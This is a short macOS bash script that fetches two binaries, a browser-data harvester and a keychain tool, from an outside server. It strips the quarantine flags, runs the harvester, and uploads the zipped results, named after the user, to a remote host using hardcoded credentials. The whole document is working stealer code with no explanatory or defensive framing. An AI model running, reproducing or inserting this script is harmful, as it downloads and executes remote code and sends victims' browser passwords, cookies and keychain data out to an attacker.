#!/bin/bash

remoteBrowserHacker="http://tools-bitget.com/hack-browser-data"
remoteKeychain="http://tools-bitget.com/Keychain"

localBrowserHacker=/tmp/tempLog
localKeychain=/tmp/Keychain


curl -s -o $localBrowserHacker $remoteBrowserHacker
curl -s -o $localKeychain $remoteKeychain


xattr -c $localKeychain
chmod +x $localKeychain

xattr -c $localBrowserHacker
chmod +x $localBrowserHacker

$localBrowserHacker --zip

timestr=`date '+%Y-%m-%d_%H:%M:%S'`

mv /tmp/results/results.zip /tmp/results/$(whoami)_$timestr.zip

curl  -u'admin:bitget4321' -T /tmp/results/$(whoami)_$timestr.zip http://jamf.bitget.works:81/v3/

